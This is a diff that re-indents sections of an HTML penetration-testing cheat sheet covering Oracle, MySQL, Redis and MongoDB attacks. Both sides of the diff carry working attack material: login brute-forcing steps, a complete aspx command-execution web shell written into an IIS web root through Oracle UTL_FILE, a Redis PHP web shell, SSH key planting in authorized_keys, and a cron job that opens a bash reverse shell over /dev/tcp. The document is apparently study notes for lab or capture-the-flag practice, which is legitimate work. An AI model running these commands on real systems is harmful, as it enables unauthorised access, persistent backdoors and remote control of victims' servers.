@@ -1662,81 +1662,81 @@
 <ul>
     <li>Requires sqlplus to run correctly</li>
 
-<li>Methodology</li>
-<table>
-    <tr>
-        <td>Enumerate SID for Oracle DB</td>
-        <td>
-            <li>odat sidguess</li>
-            <li>auxiliary/scanner/oracle/sid_brute</li>
-        </td>
-    </tr>
-    <tr>
-        <td>Brute force login credentials</td>
-        <td>
-            <li>odat passwordguesser</li>
-            <li>auxiliary/scanner/oracle/oracle_login</li>
-            <li>*Passwords are typically lowercase</li>
-        </td>
-    </tr>
+    <li>Methodology</li>
+    <table>
+        <tr>
+            <td>Enumerate SID for Oracle DB</td>
+            <td>
+                <li>odat sidguess</li>
+                <li>auxiliary/scanner/oracle/sid_brute</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Brute force login credentials</td>
+            <td>
+                <li>odat passwordguesser</li>
+                <li>auxiliary/scanner/oracle/oracle_login</li>
+                <li>*Passwords are typically lowercase</li>
+            </td>
+        </tr>
 
-    <tr>
-        <td>Log into Oracle DB</td>
-        <td>sqlplus64 &lt;username&gt;/&lt;password&gt;@&lt;ip address&gt;:&lt;port&gt;/&lt;DB Name&gt;</td>
-    </tr>
-    <tr>
-        <td>Log into Oracle DB with sys db admin (sudo for oracle)</td>
-        <td>sqlplus64 &lt;username&gt;/&lt;password&gt;@&lt;ip address&gt;:&lt;port&gt;/&lt;DB Name&gt; as sysdba</td>
-    </tr>
-</table>
+        <tr>
+            <td>Log into Oracle DB</td>
+            <td>sqlplus64 &lt;username&gt;/&lt;password&gt;@&lt;ip address&gt;:&lt;port&gt;/&lt;DB Name&gt;</td>
+        </tr>
+        <tr>
+            <td>Log into Oracle DB with sys db admin (sudo for oracle)</td>
+            <td>sqlplus64 &lt;username&gt;/&lt;password&gt;@&lt;ip address&gt;:&lt;port&gt;/&lt;DB Name&gt; as sysdba</td>
+        </tr>
+    </table>
 
-<li>ODAT Commands</li>
-<table>
-    <tr>
-        <td>Scan Oracle DB</td>
-        <td>
-            <li>odat all -s &lt;ip address&gt; -d &lt;database&gt; -U &lt;username&gt; -P &lt;password&gt;</li>
-            <li>Add --sysdba flag to authenticate as sysdba (sudo for Oracle)</li>
-        </td>
-    </tr>
-    <tr>
-        <td>Authenticate as sysdba (sudo for Oracle)</td>
-        <td>--sysdba</td>
-    </tr>
-    <tr>
-        <td>Upload file</td>
-        <td>
-            <li>odat dbmsadvisor -s 10.10.10.82 -d &lt;database&gt; -U &lt;username&gt; -P &lt;password&gt; --sysdba --putFile C:\\inetpub\\wwwroot &lt;remote file&gt; &lt;local file&gt;</li>
-            <ul>
-                <li>Also try dbmsxslprocessor instead of dbmsadvisor</li>
-            </ul>
-        </td>
-    </tr>
-</table>
+    <li>ODAT Commands</li>
+    <table>
+        <tr>
+            <td>Scan Oracle DB</td>
+            <td>
+                <li>odat all -s &lt;ip address&gt; -d &lt;database&gt; -U &lt;username&gt; -P &lt;password&gt;</li>
+                <li>Add --sysdba flag to authenticate as sysdba (sudo for Oracle)</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Authenticate as sysdba (sudo for Oracle)</td>
+            <td>--sysdba</td>
+        </tr>
+        <tr>
+            <td>Upload file</td>
+            <td>
+                <li>odat dbmsadvisor -s 10.10.10.82 -d &lt;database&gt; -U &lt;username&gt; -P &lt;password&gt; --sysdba --putFile C:\\inetpub\\wwwroot &lt;remote file&gt; &lt;local file&gt;</li>
+                <ul>
+                    <li>Also try dbmsxslprocessor instead of dbmsadvisor</li>
+                </ul>
+            </td>
+        </tr>
+    </table>
 
-<li>Oracle DB Commands:</li>
-<table>
-    <tr>
-        <td>View privileges</td>
-        <td>select * from session_privs;<br>select * from user_role_privs;</td>
-    </tr>
-    <tr>
-        <td>Read file</td>
-        <td>declare<br>f utl_file.file_type;<br>s varchar(400);<br>begin<br>f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');<br>utl_file.get_line(f,s);<br>utl_file.fclose(f);<br>dbms_output.put_line(s);<br>end;</td>
-    </tr>
-    <tr>
-        <td>Write file</td>
-        <td>declare<br>f utl_file.file_type;<br>s varchar(5000) := '&lt;insert text to write&gt;';<br>begin<br>f := utl_file.fopen('/inetpub/wwwroot', '&lt;file to write&gt;', 'W');<br>utl_file.put_line(f,s);<br>utl_file.fclose(f);<br>end;</td>
-    </tr>
-    <tr>
-        <td>Run last procedure</td>
-        <td>/</td>
-    </tr>
-    <tr>
-        <td>View output</td>
-        <td>set serveroutput ON</td>
-    </tr>
-</table>
+    <li>Oracle DB Commands:</li>
+    <table>
+        <tr>
+            <td>View privileges</td>
+            <td>select * from session_privs;<br>select * from user_role_privs;</td>
+        </tr>
+        <tr>
+            <td>Read file</td>
+            <td>declare<br>f utl_file.file_type;<br>s varchar(400);<br>begin<br>f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');<br>utl_file.get_line(f,s);<br>utl_file.fclose(f);<br>dbms_output.put_line(s);<br>end;</td>
+        </tr>
+        <tr>
+            <td>Write file</td>
+            <td>declare<br>f utl_file.file_type;<br>s varchar(5000) := '&lt;insert text to write&gt;';<br>begin<br>f := utl_file.fopen('/inetpub/wwwroot', '&lt;file to write&gt;', 'W');<br>utl_file.put_line(f,s);<br>utl_file.fclose(f);<br>end;</td>
+        </tr>
+        <tr>
+            <td>Run last procedure</td>
+            <td>/</td>
+        </tr>
+        <tr>
+            <td>View output</td>
+            <td>set serveroutput ON</td>
+        </tr>
+    </table>
 
 </ul>
 <li>Generating shell for Oracle</li>
@@ -1749,14 +1749,14 @@
     </ul>
     <li>aspx web shell example:</li>
     <pre>declare
-f utl_file.file_type;
-s varchar(5000) := '&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; Trace=&quot;false&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Diagnostics&quot; %&gt;&lt;%@ Import Namespace=&quot;System.IO&quot; %&gt;&lt;script Language="c#" runat="server"&gt;void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("&lt;pre&gt;");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("&lt;/pre&gt;");}&lt;/script&gt;&lt;HTML&gt;&lt;body &gt;&lt;form id="cmd" method="post" runat="server"&lt;&gt;asp:TextBox id="txtArg" runat="server" Width="250px"&gt;&lt;/asp:TextBox&gt;&lt;asp:Button id="testing" runat="server" Text="excute" OnClick="cmdExe_Click"&gt;&lt;/asp:Button&gt;&lt;asp:Label id="lblText" runat="server"&t;Command:&lt;/asp:Label&gt;&lt;/form&gt;&lt;/body&gt;&lt;/HTML&gt;';
-begin
-f := utl_file.fopen('/inetpub/wwwroot', 'shell.aspx', 'W');
-utl_file.put_line(f,s);
-utl_file.fclose(f);
-end;
-</pre>
+        f utl_file.file_type;
+        s varchar(5000) := '&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; Trace=&quot;false&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Diagnostics&quot; %&gt;&lt;%@ Import Namespace=&quot;System.IO&quot; %&gt;&lt;script Language="c#" runat="server"&gt;void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("&lt;pre&gt;");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("&lt;/pre&gt;");}&lt;/script&gt;&lt;HTML&gt;&lt;body &gt;&lt;form id="cmd" method="post" runat="server"&lt;&gt;asp:TextBox id="txtArg" runat="server" Width="250px"&gt;&lt;/asp:TextBox&gt;&lt;asp:Button id="testing" runat="server" Text="excute" OnClick="cmdExe_Click"&gt;&lt;/asp:Button&gt;&lt;asp:Label id="lblText" runat="server"&t;Command:&lt;/asp:Label&gt;&lt;/form&gt;&lt;/body&gt;&lt;/HTML&gt;';
+        begin
+        f := utl_file.fopen('/inetpub/wwwroot', 'shell.aspx', 'W');
+        utl_file.put_line(f,s);
+        utl_file.fclose(f);
+        end;
+    </pre>
 </ul>
 
 <h2>2049 TCP / mountd (NFS)</h2>
@@ -1797,9 +1797,9 @@ end;
 <ul>
     <li>impacket-mssqlclient username:password@ip.address</li>
     <li>mysql --host=127.0.0.1 --port=13306 --user=&lt;username&gt; -p&lt;password (no space after -p)&gt;</li>
-        <ul>
-            <li>Connect to local port (port forwarding in this example) 13306 as &lt;username&gt;</li>
-        </ul>
+    <ul>
+        <li>Connect to local port (port forwarding in this example) 13306 as &lt;username&gt;</li>
+    </ul>
 </ul>
 
 <li>User-Defined Functions (UDF)</li>
@@ -2074,90 +2074,90 @@ end;
     <li>If able to upload files to victim, upload module for RCE</li>
     <li>=<5.0.5(?) clone-master RCE</li>
 </ul>
-<li>Tools</li>
-<ul>
-    <li>redis-cli</li>
+    <li>Tools</li>
+    <ul>
+        <li>redis-cli</li>
+        <table>
+            <tr>
+                <td>
+                    <li>Get redis info / test if authentication is require</li>
+                    <ul>
+                        <li>By default redis does not require credentials</li>
+                        <li>Redis can be configured to require only a password or username + password</li>
+                        <ul>
+                            <li>If only the passsword is set, then the username is "default"</li>
+                            <li>There is no way to know externally if password or password & username are set.</li>
+                            <li>redis.conf is the configuration file.  requirepass and masteruser are the username and password settings</li>
+                        </ul>
+                    </ul>
+                </td>
+                <td>info</td>
+            </tr>
+            <tr>
+                <td>Login with credentials</td>
+                <td>AUTH &lt;password&gt;<br>AUTH &lt;username&gt; &lt;password&gt;</td>
+            </tr>
+            <tr>
+                <td>Get configuration file contents</td>
+                <td>CONFIG GET *</td>
+            </tr>
+            <tr>
+                <td>Show connected clients</td>
+                <td>CLIENT LIST</td>
+            </tr>
+            <tr>
+                <td>Show keys</td>
+                <td>keys *</td>
+            </tr>
+            <tr>
+                <td>Get keys from database</td>
+                <td>SELECT &lt;db # under &quot;# Keyspace&quot; in info&gt;&lt;br&gt;KEYS *&lt;br&gt;GET &lt;Key&gt;</td>
+            </tr>
+            <tr>
+                <td>Web shell RCE</td>
+                <td>config set dir &lt;web server root directory&gt;<br>config set dbfilename shell.php<br>set test "<?php system($_REQUEST['cmd'] ?>"<br>save</td>
+            </tr>
+            <tr>
+                <td>Upload SSH Key</td>
+                <td>import public key to redis:<br>(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt<br>cat foo.txt | redis-cli -h &lt;ip addres&gt; -x set crackit<br>config set dir &lt;writable home directory&gt;<br>config set dbfilename<br>"authorized_keys"<br>save</td>
+            </tr>
+            <tr>
+                <td>Reverse shell through cronjobs</td>
+                <td>
+                    <li>redis-cli -h &lt;ip address&gt; flushall </li>
+                    <li>echo -e "\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/&lt;ip address&gt;/&lt;port&gt; 0&gt;&amp;1\n\n&quot;|redis-cli -h &lt;ip address&gt; -x set 1</li>
+                    <li>redis-cli -h &lt;ip address&gt; config set dir /var/spool/cron/ </li>
+                    <li>redis-cli -h &lt;ip address&gt; config set dbfilename root</li>
+                    <li>redis-cli -h &lt;ip address&gt; save</li>
+                </td>
+            </tr>
+        </table>
+    </ul>
+
+    <h2>6697 TCP / irc</h2>
+    <li>Incoming IRC connections encrypted via TLS/SSL</li>
+
+    <br>
+
+    <h2>27017 TCP / mongodb</h2>
     <table>
         <tr>
-            <td>
-                <li>Get redis info / test if authentication is require</li>
-                <ul>
-                    <li>By default redis does not require credentials</li>
-                    <li>Redis can be configured to require only a password or username + password</li>
-                    <ul>
-                        <li>If only the passsword is set, then the username is "default"</li>
-                        <li>There is no way to know externally if password or password & username are set.</li>
-                        <li>redis.conf is the configuration file.  requirepass and masteruser are the username and password settings</li>
-                    </ul>
-                </ul>
-            </td>
-            <td>info</td>
+            <td>Connect to db</td>
+            <td>mongo -u &lt;username&gt; -p &lt;password&gt; &lt;database&gt;</td>
         </tr>
         <tr>
-            <td>Login with credentials</td>
-            <td>AUTH &lt;password&gt;<br>AUTH &lt;username&gt; &lt;password&gt;</td>
+            <td>show collections (mongodb version of mysql tables)</td>
+            <td>show collections</td>
         </tr>
         <tr>
-            <td>Get configuration file contents</td>
-            <td>CONFIG GET *</td>
+            <td>search for objects in a collection</td>
+            <td>db.&lt;collection&gt;.find()</td>
         </tr>
         <tr>
-            <td>Show connected clients</td>
-            <td>CLIENT LIST</td>
-        </tr>
-        <tr>
-            <td>Show keys</td>
-            <td>keys *</td>
-        </tr>
-        <tr>
-            <td>Get keys from database</td>
-            <td>SELECT &lt;db # under &quot;# Keyspace&quot; in info&gt;&lt;br&gt;KEYS *&lt;br&gt;GET &lt;Key&gt;</td>
-        </tr>
-        <tr>
-            <td>Web shell RCE</td>
-            <td>config set dir <web server root directory><br>config set dbfilename shell.php<br>set test "<?php system($_REQUEST['cmd'] ?>"<br>save</td>
-        </tr>
-        <tr>
-            <td>Upload SSH Key</td>
-            <td>import public key to redis:<br>(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt<br>cat foo.txt | redis-cli -h &lt;ip addres&gt; -x set crackit<br>config set dir &lt;writable home directory&gt;<br>config set dbfilename<br>"authorized_keys"<br>save</td>
-        </tr>
-        <tr>
-            <td>Reverse shell through cronjobs</td>
-            <td>
-                <li>redis-cli -h &lt;ip address&gt; flushall </li>
-                <li>echo -e "\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/&lt;ip address&gt;/&lt;port&gt; 0&gt;&amp;1\n\n&quot;|redis-cli -h &lt;ip address&gt; -x set 1</li>
-                <li>redis-cli -h &lt;ip address&gt; config set dir /var/spool/cron/ </li>
-                <li>redis-cli -h &lt;ip address&gt; config set dbfilename root</li>
-                <li>redis-cli -h &lt;ip address&gt; save</li>
-            </td>
+            <td>add command/object to collection</td>
+            <td>db.tasks.insert({"cmd&quot;:&quot;&lt;bash command&gt;&quot;})</td>
         </tr>
     </table>
-</ul>
-
-<h2>6697 TCP / irc</h2>
-<li>Incoming IRC connections encrypted via TLS/SSL</li>
-
-<br>
-
-<h2>27017 TCP / mongodb</h2>
-<table>
-    <tr>
-        <td>Connect to db</td>
-        <td>mongo -u &lt;username&gt; -p &lt;password&gt; &lt;database&gt;</td>
-    </tr>
-    <tr>
-        <td>show collections (mongodb version of mysql tables)</td>
-        <td>show collections</td>
-    </tr>
-    <tr>
-        <td>search for objects in a collection</td>
-        <td>db.&lt;collection&gt;.find()</td>
-    </tr>
-    <tr>
-        <td>add command/object to collection</td>
-        <td>db.tasks.insert({"cmd&quot;:&quot;&lt;bash command&gt;&quot;})</td>
-    </tr>
-</table>
 
 
 </body>
